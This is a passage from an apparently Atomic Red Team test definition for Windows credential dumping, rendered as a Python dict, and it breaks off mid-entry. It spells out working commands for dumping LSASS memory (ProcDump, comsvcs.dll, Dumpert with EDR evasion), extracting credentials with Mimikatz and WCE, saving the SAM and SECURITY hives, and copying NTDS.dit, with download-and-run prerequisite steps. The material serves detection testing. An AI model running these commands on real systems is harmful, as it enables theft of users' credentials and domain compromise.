                                                                  'name': 'Gsecdump',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Windows '
                                                                                                   'Credential '
                                                                                                   'Editor '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'on '
                                                                                                   'disk '
                                                                                                   'at '
                                                                                                   'specified '
                                                                                                   'location '
                                                                                                   '(#{wce_exe})\n',
                                                                                    'get_prereq_command': '$parentpath '
                                                                                                          '= '
                                                                                                          'Split-Path '
                                                                                                          '"#{wce_exe}"; '
                                                                                                          '$zippath '
                                                                                                          '= '
                                                                                                          '"$parentpath\\wce.zip"\n'
                                                                                                          'IEX(IWR '
                                                                                                          '"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-WebRequestVerifyHash.ps1")\n'
                                                                                                          'if(Invoke-WebRequestVerifyHash '
                                                                                                          '"#{wce_url}" '
                                                                                                          '"$zippath" '
                                                                                                          '#{wce_zip_hash}){\n'
                                                                                                          '  '
                                                                                                          'Expand-Archive '
                                                                                                          '$zippath '
                                                                                                          '$parentpath\\wce '
                                                                                                          '-Force\n'
                                                                                                          '  '
                                                                                                          'Move-Item '
                                                                                                          '$parentpath\\wce\\wce.exe '
                                                                                                          '"#{wce_exe}"\n'
                                                                                                          '  '
                                                                                                          'Remove-Item '
                                                                                                          '$zippath, '
                                                                                                          '$parentpath\\wce '
                                                                                                          '-Recurse\n'
                                                                                                          '}\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(Test-Path '
                                                                                                      '#{wce_exe}) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'Dump '
                                                                                 'user '
                                                                                 'credentials '
                                                                                 'using '
                                                                                 'Windows '
                                                                                 'Credential '
                                                                                 'Editor '
                                                                                 '(supports '
                                                                                 'Windows '
                                                                                 'XP, '
                                                                                 '2003, '
                                                                                 'Vista, '
                                                                                 '7, '
                                                                                 '2008 '
                                                                                 'and '
                                                                                 'Windows '
                                                                                 '8 '
                                                                                 'only)\n'
                                                                                 '\n'
                                                                                 'Upon '
                                                                                 'successful '
                                                                                 'execution, '
                                                                                 'you '
                                                                                 'should '
                                                                                 'see '
                                                                                 'a '
                                                                                 'file '
                                                                                 'with '
                                                                                 'user '
                                                                                 'passwords/hashes '
                                                                                 'at '
                                                                                 '%temp%/wce-output.file.\n'
                                                                                 '\n'
                                                                                 'If '
                                                                                 'you '
                                                                                 'see '
                                                                                 'no '
                                                                                 'output '
                                                                                 'it '
                                                                                 'is '
                                                                                 'likely '
                                                                                 'that '
                                                                                 'execution '
                                                                                 'was '
                                                                                 'blocked '
                                                                                 'by '
                                                                                 'Anti-Virus. \n'
                                                                                 '\n'
                                                                                 'If '
                                                                                 'you '
                                                                                 'see '
                                                                                 'a '
                                                                                 'message '
                                                                                 'saying '
                                                                                 '"wce.exe '
                                                                                 'is '
                                                                                 'not '
                                                                                 'recognized '
                                                                                 'as '
                                                                                 'an '
                                                                                 'internal '
                                                                                 'or '
                                                                                 'external '
                                                                                 'command", '
                                                                                 'try '
                                                                                 'using '
                                                                                 'the  '
                                                                                 'get-prereq_commands '
                                                                                 'to '
                                                                                 'download '
                                                                                 'and '
                                                                                 'install '
                                                                                 'Windows '
                                                                                 'Credential '
                                                                                 'Editor '
                                                                                 'first.\n',
                                                                  'executor': {'cleanup_command': 'del '
                                                                                                  '"#{output_file}" '
                                                                                                  '>nul '
                                                                                                  '2>&1',
                                                                               'command': '#{wce_exe} '
                                                                                          '-o '
                                                                                          '#{output_file}\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'output_file': {'default': '%temp%\\wce-output.txt',
                                                                                                      'description': 'Path '
                                                                                                                     'where '
                                                                                                                     'resulting '
                                                                                                                     'data '
                                                                                                                     'should '
                                                                                                                     'be '
                                                                                                                     'placed',
                                                                                                      'type': 'Path'},
                                                                                      'wce_exe': {'default': 'PathToAtomicsFolder\\T1003\\bin\\wce.exe',
                                                                                                  'description': 'Path '
                                                                                                                 'of '
                                                                                                                 'Windows '
                                                                                                                 'Credential '
                                                                                                                 'Editor '
                                                                                                                 'executable',
                                                                                                  'type': 'Path'},
                                                                                      'wce_url': {'default': 'https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip',
                                                                                                  'description': 'Path '
                                                                                                                 'to '
                                                                                                                 'download '
                                                                                                                 'Windows '
                                                                                                                 'Credential '
                                                                                                                 'Editor '
                                                                                                                 'zip '
                                                                                                                 'file',
                                                                                                  'type': 'url'},
                                                                                      'wce_zip_hash': {'default': '8F4EFA0DDE5320694DD1AA15542FE44FDE4899ED7B3A272063902E773B6C4933',
                                                                                                       'description': 'File '
                                                                                                                      'hash '
                                                                                                                      'of '
                                                                                                                      'the '
                                                                                                                      'Windows '
                                                                                                                      'Credential '
                                                                                                                      'Editor '
                                                                                                                      'zip '
                                                                                                                      'file',
                                                                                                       'type': 'String'}},
                                                                  'name': 'Windows '
                                                                          'Credential '
                                                                          'Editor',
                                                                  'supported_platforms': ['windows']},
                                                                 {'description': 'Local '
                                                                                 'SAM '
                                                                                 '(SAM '
                                                                                 '& '
                                                                                 'System), '
                                                                                 'cached '
                                                                                 'credentials '
                                                                                 '(System '
                                                                                 '& '
                                                                                 'Security) '
                                                                                 'and '
                                                                                 'LSA '
                                                                                 'secrets '
                                                                                 '(System '
                                                                                 '& '
                                                                                 'Security) '
                                                                                 'can '
                                                                                 'be '
                                                                                 'enumerated\n'
                                                                                 'via '
                                                                                 'three '
                                                                                 'registry '
                                                                                 'keys. '
                                                                                 'Then '
                                                                                 'processed '
                                                                                 'locally '
                                                                                 'using '
                                                                                 'https://github.com/Neohapsis/creddump7\n'
                                                                                 '\n'
                                                                                 'Upon '
                                                                                 'successful '
                                                                                 'execution '
                                                                                 'of '
                                                                                 'this '
                                                                                 'test, '
                                                                                 'you '
                                                                                 'will '
                                                                                 'find '
                                                                                 'three '
                                                                                 'files '
                                                                                 'named, '
                                                                                 'sam, '
                                                                                 'system '
                                                                                 'and '
                                                                                 'security '
                                                                                 'in '
                                                                                 'the '
                                                                                 '%temp% '
                                                                                 'directory.\n',
                                                                  'executor': {'cleanup_command': 'del '
                                                                                                  '%temp%\\sam '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n'
                                                                                                  'del '
                                                                                                  '%temp%\\system '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n'
                                                                                                  'del '
                                                                                                  '%temp%\\security '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n',
                                                                               'command': 'reg '
                                                                                          'save '
                                                                                          'HKLM\\sam '
                                                                                          '%temp%\\sam\n'
                                                                                          'reg '
                                                                                          'save '
                                                                                          'HKLM\\system '
                                                                                          '%temp%\\system\n'
                                                                                          'reg '
                                                                                          'save '
                                                                                          'HKLM\\security '
                                                                                          '%temp%\\security\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'name': 'Registry '
                                                                          'dump '
                                                                          'of '
                                                                          'SAM, '
                                                                          'creds, '
                                                                          'and '
                                                                          'secrets',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'ProcDump '
                                                                                                   'tool '
                                                                                                   'from '
                                                                                                   'Sysinternals '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'on '
                                                                                                   'disk '
                                                                                                   'at '
                                                                                                   'specified '
                                                                                                   'location '
                                                                                                   '(#{procdump_exe})\n',
                                                                                    'get_prereq_command': 'Invoke-WebRequest '
                                                                                                          '"https://download.sysinternals.com/files/Procdump.zip" '
                                                                                                          '-OutFile '
                                                                                                          '"$env:TEMP\\Procdump.zip"\n'
                                                                                                          'Expand-Archive '
                                                                                                          '$env:TEMP\\Procdump.zip '
                                                                                                          '$env:TEMP\\Procdump '
                                                                                                          '-Force\n'
                                                                                                          'New-Item '
                                                                                                          '-ItemType '
                                                                                                          'Directory '
                                                                                                          '(Split-Path '
                                                                                                          '#{procdump_exe}) '
                                                                                                          '-Force '
                                                                                                          '| '
                                                                                                          'Out-Null\n'
                                                                                                          'Copy-Item '
                                                                                                          '$env:TEMP\\Procdump\\Procdump.exe '
                                                                                                          '#{procdump_exe} '
                                                                                                          '-Force\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(Test-Path '
                                                                                                      '#{procdump_exe}) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'The '
                                                                                 'memory '
                                                                                 'of '
                                                                                 'lsass.exe '
                                                                                 'is '
                                                                                 'often '
                                                                                 'dumped '
                                                                                 'for '
                                                                                 'offline '
                                                                                 'credential '
                                                                                 'theft '
                                                                                 'attacks. '
                                                                                 'This '
                                                                                 'can '
                                                                                 'be '
                                                                                 'achieved '
                                                                                 'with '
                                                                                 'Sysinternals\n'
                                                                                 'ProcDump.\n'
                                                                                 '\n'
                                                                                 'Upon '
                                                                                 'successful '
                                                                                 'execution, '
                                                                                 'you '
                                                                                 'should '
                                                                                 'see '
                                                                                 'the '
                                                                                 'following '
                                                                                 'file '
                                                                                 'created '
                                                                                 'c:\\windows\\temp\\lsass_dump.dmp.\n'
                                                                                 '\n'
                                                                                 'If '
                                                                                 'you '
                                                                                 'see '
                                                                                 'a '
                                                                                 'message '
                                                                                 'saying '
                                                                                 '"procdump.exe '
                                                                                 'is '
                                                                                 'not '
                                                                                 'recognized '
                                                                                 'as '
                                                                                 'an '
                                                                                 'internal '
                                                                                 'or '
                                                                                 'external '
                                                                                 'command", '
                                                                                 'try '
                                                                                 'using '
                                                                                 'the  '
                                                                                 'get-prereq_commands '
                                                                                 'to '
                                                                                 'download '
                                                                                 'and '
                                                                                 'install '
                                                                                 'the '
                                                                                 'ProcDump '
                                                                                 'tool '
                                                                                 'first.\n',
                                                                  'executor': {'cleanup_command': 'del '
                                                                                                  '"#{output_file}" '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n',
                                                                               'command': '#{procdump_exe} '
                                                                                          '-accepteula '
                                                                                          '-ma '
                                                                                          'lsass.exe '
                                                                                          '#{output_file}\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'output_file': {'default': 'C:\\Windows\\Temp\\lsass_dump.dmp',
                                                                                                      'description': 'Path '
                                                                                                                     'where '
                                                                                                                     'resulting '
                                                                                                                     'dump '
                                                                                                                     'should '
                                                                                                                     'be '
                                                                                                                     'placed',
                                                                                                      'type': 'Path'},
                                                                                      'procdump_exe': {'default': 'PathToAtomicsFolder\\T1003\\bin\\procdump.exe',
                                                                                                       'description': 'Path '
                                                                                                                      'of '
                                                                                                                      'Procdump '
                                                                                                                      'executable',
                                                                                                       'type': 'Path'}},
                                                                  'name': 'Dump '
                                                                          'LSASS.exe '
                                                                          'Memory '
                                                                          'using '
                                                                          'ProcDump',
                                                                  'supported_platforms': ['windows']},
                                                                 {'description': 'The '
                                                                                 'memory '
                                                                                 'of '
                                                                                 'lsass.exe '
                                                                                 'is '
                                                                                 'often '
                                                                                 'dumped '
                                                                                 'for '
                                                                                 'offline '
                                                                                 'credential '
                                                                                 'theft '
                                                                                 'attacks. '
                                                                                 'This '
                                                                                 'can '
                                                                                 'be '
                                                                                 'achieved '
                                                                                 'with '
                                                                                 'a '
                                                                                 'built-in '
                                                                                 'dll.\n'
                                                                                 '\n'
                                                                                 'Upon '
                                                                                 'successful '
                                                                                 'execution, '
                                                                                 'you '
                                                                                 'should '
                                                                                 'see '
                                                                                 'the '
                                                                                 'following '
                                                                                 'file '
                                                                                 'created '
                                                                                 '$env:TEMP\\lsass-comsvcs.dmp.\n',
                                                                  'executor': {'cleanup_command': 'Remove-Item '
                                                                                                  '$env:TEMP\\lsass-comsvcs.dmp '
                                                                                                  '-ErrorAction '
                                                                                                  'Ignore\n',
                                                                               'command': 'C:\\Windows\\System32\\rundll32.exe '
                                                                                          'C:\\windows\\System32\\comsvcs.dll, '
                                                                                          'MiniDump '
                                                                                          '(Get-Process '
                                                                                          'lsass).id '
                                                                                          '$env:TEMP\\lsass-comsvcs.dmp '
                                                                                          'full\n',
                                                                               'elevation_required': True,
                                                                               'name': 'powershell'},
                                                                  'name': 'Dump '
                                                                          'LSASS.exe '
                                                                          'Memory '
                                                                          'using '
                                                                          'comsvcs.dll',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Dumpert '
                                                                                                   'executable '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'on '
                                                                                                   'disk '
                                                                                                   'at '
                                                                                                   'specified '
                                                                                                   'location '
                                                                                                   '(#{dumpert_exe})\n',
                                                                                    'get_prereq_command': 'New-Item '
                                                                                                          '-ItemType '
                                                                                                          'Directory '
                                                                                                          '(Split-Path '
                                                                                                          '#{dumpert_exe}) '
                                                                                                          '-Force '
                                                                                                          '| '
                                                                                                          'Out-Null\n'
                                                                                                          'Invoke-WebRequest '
                                                                                                          '"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe" '
                                                                                                          '-OutFile '
                                                                                                          '#{dumpert_exe}\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(Test-Path '
                                                                                                      '#{dumpert_exe}) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'The '
                                                                                 'memory '
                                                                                 'of '
                                                                                 'lsass.exe '
                                                                                 'is '
                                                                                 'often '
                                                                                 'dumped '
                                                                                 'for '
                                                                                 'offline '
                                                                                 'credential '
                                                                                 'theft '
                                                                                 'attacks. '
                                                                                 'This '
                                                                                 'can '
                                                                                 'be '
                                                                                 'achieved '
                                                                                 'using '
                                                                                 'direct '
                                                                                 'system '
                                                                                 'calls '
                                                                                 'and '
                                                                                 'API '
                                                                                 'unhooking '
                                                                                 'in '
                                                                                 'an '
                                                                                 'effort '
                                                                                 'to '
                                                                                 'avoid '
                                                                                 'detection. \n'
                                                                                 'https://github.com/outflanknl/Dumpert\n'
                                                                                 'https://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\n'
                                                                                 'Upon '
                                                                                 'successful '
                                                                                 'execution, '
                                                                                 'you '
                                                                                 'should '
                                                                                 'see '
                                                                                 'the '
                                                                                 'following '
                                                                                 'file '
                                                                                 'created '
                                                                                 'C:\\windows\\temp\\dumpert.dmp.\n'
                                                                                 '\n'
                                                                                 'If '
                                                                                 'you '
                                                                                 'see '
                                                                                 'a '
                                                                                 'message '
                                                                                 'saying '
                                                                                 '"The '
                                                                                 'system '
                                                                                 'cannot '
                                                                                 'find '
                                                                                 'the '
                                                                                 'path '
                                                                                 'specified.", '
                                                                                 'try '
                                                                                 'using '
                                                                                 'the  '
                                                                                 'get-prereq_commands '
                                                                                 'to '
                                                                                 'download '
                                                                                 'the  '
                                                                                 'tool '
                                                                                 'first.\n',
                                                                  'executor': {'cleanup_command': 'del '
                                                                                                  'C:\\windows\\temp\\dumpert.dmp '
                                                                                                  '>nul '
                                                                                                  '2> '
                                                                                                  'nul\n',
                                                                               'command': '#{dumpert_exe}\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'dumpert_exe': {'default': 'PathToAtomicsFolder\\T1003\\bin\\Outflank-Dumpert.exe',
                                                                                                      'description': 'Path '
                                                                                                                     'of '
                                                                                                                     'Dumpert '
                                                                                                                     'executable',
                                                                                                      'type': 'Path'}},
                                                                  'name': 'Dump '
                                                                          'LSASS.exe '
                                                                          'Memory '
                                                                          'using '
                                                                          'direct '
                                                                          'system '
                                                                          'calls '
                                                                          'and '
                                                                          'API '
                                                                          'unhooking',
                                                                  'supported_platforms': ['windows']},
                                                                 {'description': 'The '
                                                                                 'memory '
                                                                                 'of '
                                                                                 'lsass.exe '
                                                                                 'is '
                                                                                 'often '
                                                                                 'dumped '
                                                                                 'for '
                                                                                 'offline '
                                                                                 'credential '
                                                                                 'theft '
                                                                                 'attacks. '
                                                                                 'This '
                                                                                 'can '
                                                                                 'be '
                                                                                 'achieved '
                                                                                 'with '
                                                                                 'the '
                                                                                 'Windows '
                                                                                 'Task\n'
                                                                                 'Manager '
                                                                                 'and '
                                                                                 'administrative '
                                                                                 'permissions.\n',
                                                                  'executor': {'name': 'manual',
                                                                               'steps': '1. '
                                                                                        'Open '
                                                                                        'Task '
                                                                                        'Manager:\n'
                                                                                        '  '
                                                                                        'On '
                                                                                        'a '
                                                                                        'Windows '
                                                                                        'system '
                                                                                        'this '
                                                                                        'can '
                                                                                        'be '
                                                                                        'accomplished '
                                                                                        'by '
                                                                                        'pressing '
                                                                                        'CTRL-ALT-DEL '
                                                                                        'and '
                                                                                        'selecting '
                                                                                        'Task '
                                                                                        'Manager '
                                                                                        'or '
                                                                                        'by '
                                                                                        'right-clicking\n'
                                                                                        '  '
                                                                                        'on '
                                                                                        'the '
                                                                                        'task '
                                                                                        'bar '
                                                                                        'and '
                                                                                        'selecting '
                                                                                        '"Task '
                                                                                        'Manager".\n'
                                                                                        '\n'
                                                                                        '2. '
                                                                                        'Select '
                                                                                        'lsass.exe:\n'
                                                                                        '  '
                                                                                        'If '
                                                                                        'lsass.exe '
                                                                                        'is '
                                                                                        'not '
                                                                                        'visible, '
                                                                                        'select '
                                                                                        '"Show '
                                                                                        'processes '
                                                                                        'from '
                                                                                        'all '
                                                                                        'users". '
                                                                                        'This '
                                                                                        'will '
                                                                                        'allow '
                                                                                        'you '
                                                                                        'to '
                                                                                        'observe '
                                                                                        'execution '
                                                                                        'of '
                                                                                        'lsass.exe\n'
                                                                                        '  '
                                                                                        'and '
                                                                                        'select '
                                                                                        'it '
                                                                                        'for '
                                                                                        'manipulation.\n'
                                                                                        '\n'
                                                                                        '3. '
                                                                                        'Dump '
                                                                                        'lsass.exe '
                                                                                        'memory:\n'
                                                                                        '  '
                                                                                        'Right-click '
                                                                                        'on '
                                                                                        'lsass.exe '
                                                                                        'in '
                                                                                        'Task '
                                                                                        'Manager. '
                                                                                        'Select '
                                                                                        '"Create '
                                                                                        'Dump '
                                                                                        'File". '
                                                                                        'The '
                                                                                        'following '
                                                                                        'dialog '
                                                                                        'will '
                                                                                        'show '
                                                                                        'you '
                                                                                        'the '
                                                                                        'path '
                                                                                        'to '
                                                                                        'the '
                                                                                        'saved '
                                                                                        'file.\n'},
                                                                  'name': 'Dump '
                                                                          'LSASS.exe '
                                                                          'Memory '
                                                                          'using '
                                                                          'Windows '
                                                                          'Task '
                                                                          'Manager',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Mimikatz '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'on '
                                                                                                   'disk '
                                                                                                   'at '
                                                                                                   'specified '
                                                                                                   'location '
                                                                                                   '(#{mimikatz_exe})\n',
                                                                                    'get_prereq_command': 'Invoke-WebRequest '
                                                                                                          '"https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200308/mimikatz_trunk.zip" '
                                                                                                          '-OutFile '
                                                                                                          '"$env:TEMP\\Mimi.zip"\n'
                                                                                                          'Expand-Archive '
                                                                                                          '$env:TEMP\\Mimi.zip '
                                                                                                          '$env:TEMP\\Mimi '
                                                                                                          '-Force\n'
                                                                                                          'New-Item '
                                                                                                          '-ItemType '
                                                                                                          'Directory '
                                                                                                          '(Split-Path '
                                                                                                          '#{mimikatz_exe}) '
                                                                                                          '-Force '
                                                                                                          '| '
                                                                                                          'Out-Null\n'
                                                                                                          'Copy-Item '
                                                                                                          '$env:TEMP\\Mimi\\x64\\mimikatz.exe '
                                                                                                          '#{mimikatz_exe} '
                                                                                                          '-Force\n',
                                                                                    'prereq_command': 'if '
                                                                                                      '(Test-Path '
                                                                                                      '#{mimikatz_exe}) '
                                                                                                      '{exit '
                                                                                                      '0} '
                                                                                                      'else '
                                                                                                      '{exit '
                                                                                                      '1}\n'},
                                                                                   {'description': 'Lsass '
                                                                                                   'dump '
                                                                                                   'must '
                                                                                                   'exist '
                                                                                                   'at '
                                                                                                   'specified '
                                                                                                   'location '
                                                                                                   '(#{input_file})\n',
                                                                                    'get_prereq_command': 'Write-Host '
                                                                                                          '"Create '
                                                                                                          'the '
                                                                                                          'lsass '
                                                                                                          'dump '
                                                                                                          'manually '
                                                                                                          'using '
                                                                                                          'the '
                                                                                                          'steps '
                                                                                                          'in '
                                                                                                          'the '
                                                                                                          'previous '
                                                                                                          'test '
                                                                                                          '(Dump '
                                                                                                          'LSASS.exe '
                                                                                                          'Memory '
                                                                                                          'using '
                                                                                                          'Windows '
                                                                                                          'Task '
                                                                                                          'Manager)"\n',
                                                                                    'prereq_command': 'cmd '
                                                                                                      '/c '
                                                                                                      '"if '
                                                                                                      'not '
                                                                                                      'exist '
                                                                                                      '#{input_file} '
                                                                                                      '(exit '
                                                                                                      '/b '
                                                                                                      '1)"\n'}],
                                                                  'dependency_executor_name': 'powershell',
                                                                  'description': 'The '
                                                                                 'memory '
                                                                                 'of '
                                                                                 'lsass.exe '
                                                                                 'is '
                                                                                 'often '
                                                                                 'dumped '
                                                                                 'for '
                                                                                 'offline '
                                                                                 'credential '
                                                                                 'theft '
                                                                                 'attacks. '
                                                                                 'Adversaries '
                                                                                 'commonly '
                                                                                 'perform '
                                                                                 'this '
                                                                                 'offline '
                                                                                 'analysis '
                                                                                 'with\n'
                                                                                 'Mimikatz. '
                                                                                 'This '
                                                                                 'tool '
                                                                                 'is '
                                                                                 'available '
                                                                                 'at '
                                                                                 'https://github.com/gentilkiwi/mimikatz '
                                                                                 'and '
                                                                                 'can '
                                                                                 'be '
                                                                                 'obtained '
                                                                                 'using '
                                                                                 'the '
                                                                                 'get-prereq_commands.\n',
                                                                  'executor': {'command': '#{mimikatz_exe} '
                                                                                          '"sekurlsa::minidump '
                                                                                          '#{input_file}" '
                                                                                          '"sekurlsa::logonpasswords '
                                                                                          'full" '
                                                                                          'exit\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'input_file': {'default': '%tmp%\\lsass.DMP',
                                                                                                     'description': 'Path '
                                                                                                                    'of '
                                                                                                                    'the '
                                                                                                                    'Lsass '
                                                                                                                    'dump',
                                                                                                     'type': 'Path'},
                                                                                      'mimikatz_exe': {'default': 'PathToAtomicsFolder\\T1003\\bin\\mimikatz.exe',
                                                                                                       'description': 'Path '
                                                                                                                      'of '
                                                                                                                      'the '
                                                                                                                      'Mimikatz '
                                                                                                                      'binary',
                                                                                                       'type': 'string'}},
                                                                  'name': 'Offline '
                                                                          'Credential '
                                                                          'Theft '
                                                                          'With '
                                                                          'Mimikatz',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Target '
                                                                                                   'must '
                                                                                                   'be '
                                                                                                   'a '
                                                                                                   'Domain '
                                                                                                   'Controller\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          'Sorry, '
                                                                                                          'Promoting '
                                                                                                          'this '
                                                                                                          'machine '
                                                                                                          'to '
                                                                                                          'a '
                                                                                                          'Domain '
                                                                                                          'Controller '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'done '
                                                                                                          'manually\n',
                                                                                    'prereq_command': 'reg '
                                                                                                      'query '
                                                                                                      'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  '
                                                                                                      '/v '
                                                                                                      'ProductType '
                                                                                                      '| '
                                                                                                      'findstr '
                                                                                                      'LanmanNT\n'}],
                                                                  'description': 'This '
                                                                                 'test '
                                                                                 'is '
                                                                                 'intended '
                                                                                 'to '
                                                                                 'be '
                                                                                 'run '
                                                                                 'on '
                                                                                 'a '
                                                                                 'domain '
                                                                                 'Controller.\n'
                                                                                 '\n'
                                                                                 'The '
                                                                                 'Active '
                                                                                 'Directory '
                                                                                 'database '
                                                                                 'NTDS.dit '
                                                                                 'may '
                                                                                 'be '
                                                                                 'dumped '
                                                                                 'using '
                                                                                 'NTDSUtil '
                                                                                 'for '
                                                                                 'offline '
                                                                                 'credential '
                                                                                 'theft '
                                                                                 'attacks. '
                                                                                 'This '
                                                                                 'capability\n'
                                                                                 'uses '
                                                                                 'the '
                                                                                 '"IFM" '
                                                                                 'or '
                                                                                 '"Install '
                                                                                 'From '
                                                                                 'Media" '
                                                                                 'backup '
                                                                                 'functionality '
                                                                                 'that '
                                                                                 'allows '
                                                                                 'Active '
                                                                                 'Directory '
                                                                                 'restoration '
                                                                                 'or '
                                                                                 'installation '
                                                                                 'of\n'
                                                                                 'subsequent '
                                                                                 'domain '
                                                                                 'controllers '
                                                                                 'without '
                                                                                 'the '
                                                                                 'need '
                                                                                 'of '
                                                                                 'network-based '
                                                                                 'replication.\n'
                                                                                 '\n'
                                                                                 'Upon '
                                                                                 'successful '
                                                                                 'completion, '
                                                                                 'you '
                                                                                 'will '
                                                                                 'find '
                                                                                 'a '
                                                                                 'copy '
                                                                                 'of '
                                                                                 'the '
                                                                                 'ntds.dit '
                                                                                 'file '
                                                                                 'in '
                                                                                 'the '
                                                                                 'C:\\Windows\\Temp '
                                                                                 'directory.\n',
                                                                  'executor': {'command': 'ntdsutil '
                                                                                          '"ac '
                                                                                          'i '
                                                                                          'ntds" '
                                                                                          '"ifm" '
                                                                                          '"create '
                                                                                          'full '
                                                                                          '#{output_folder}" '
                                                                                          'q '
                                                                                          'q\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'output_folder': {'default': 'C:\\Windows\\Temp',
                                                                                                        'description': 'Path '
                                                                                                                       'where '
                                                                                                                       'resulting '
                                                                                                                       'dump '
                                                                                                                       'should '
                                                                                                                       'be '
                                                                                                                       'placed',
                                                                                                        'type': 'Path'}},
                                                                  'name': 'Dump '
                                                                          'Active '
                                                                          'Directory '
                                                                          'Database '
                                                                          'with '
                                                                          'NTDSUtil',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Target '
                                                                                                   'must '
                                                                                                   'be '
                                                                                                   'a '
                                                                                                   'Domain '
                                                                                                   'Controller\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          'Sorry, '
                                                                                                          'Promoting '
                                                                                                          'this '
                                                                                                          'machine '
                                                                                                          'to '
                                                                                                          'a '
                                                                                                          'Domain '
                                                                                                          'Controller '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'done '
                                                                                                          'manually\n',
                                                                                    'prereq_command': 'reg '
                                                                                                      'query '
                                                                                                      'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  '
                                                                                                      '/v '
                                                                                                      'ProductType '
                                                                                                      '| '
                                                                                                      'findstr '
                                                                                                      'LanmanNT\n'}],
                                                                  'description': 'This '
                                                                                 'test '
                                                                                 'is '
                                                                                 'intended '
                                                                                 'to '
                                                                                 'be '
                                                                                 'run '
                                                                                 'on '
                                                                                 'a '
                                                                                 'domain '
                                                                                 'Controller.\n'
                                                                                 '\n'
                                                                                 'The '
                                                                                 'Active '
                                                                                 'Directory '
                                                                                 'database '
                                                                                 'NTDS.dit '
                                                                                 'may '
                                                                                 'be '
                                                                                 'dumped '
                                                                                 'by '
                                                                                 'copying '
                                                                                 'it '
                                                                                 'from '
                                                                                 'a '
                                                                                 'Volume '
                                                                                 'Shadow '
                                                                                 'Copy.\n',
                                                                  'executor': {'command': 'vssadmin.exe '
                                                                                          'create '
                                                                                          'shadow '
                                                                                          '/for=#{drive_letter}\n',
                                                                               'elevation_required': True,
                                                                               'name': 'command_prompt'},
                                                                  'input_arguments': {'drive_letter': {'default': 'C:',
                                                                                                       'description': 'Drive '
                                                                                                                      'letter '
                                                                                                                      'to '
                                                                                                                      'source '
                                                                                                                      'VSC '
                                                                                                                      '(including '
                                                                                                                      'colon)',
                                                                                                       'type': 'String'}},
                                                                  'name': 'Create '
                                                                          'Volume '
                                                                          'Shadow '
                                                                          'Copy '
                                                                          'with '
                                                                          'NTDS.dit',
                                                                  'supported_platforms': ['windows']},
                                                                 {'dependencies': [{'description': 'Target '
                                                                                                   'must '
                                                                                                   'be '
                                                                                                   'a '
                                                                                                   'Domain '
                                                                                                   'Controller\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          'Sorry, '
                                                                                                          'Promoting '
                                                                                                          'this '
                                                                                                          'machine '
                                                                                                          'to '
                                                                                                          'a '
                                                                                                          'Domain '
                                                                                                          'Controller '
                                                                                                          'must '
                                                                                                          'be '
                                                                                                          'done '
                                                                                                          'manually\n',
                                                                                    'prereq_command': 'reg '
                                                                                                      'query '
                                                                                                      'HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\ProductOptions  '
                                                                                                      '/v '
                                                                                                      'ProductType '
                                                                                                      '| '
                                                                                                      'findstr '
                                                                                                      'LanmanNT\n'},
                                                                                   {'description': 'Volume '
                                                                                                   'shadow '
                                                                                                   'copy '
                                                                                                   'must '
                                                                                                   'exist\n',
                                                                                    'get_prereq_command': 'echo '
                                                                                                          'Run '
                                                                                                          '"Invoke-AtomicTest '
                                                                                                          'T1003 '
                                                                                                          '-TestName '
                                                                                                          "'Create "
                                                                                                          'Volume '
                                                                                                          'Shadow '
                                                                                                          'Copy '
                                                                                                          'with '
                                                                                                          'NTDS.dit\'" '
                                                                                                          'to '
                                                                                                          'fulfuill '
                                                                                                          'this '
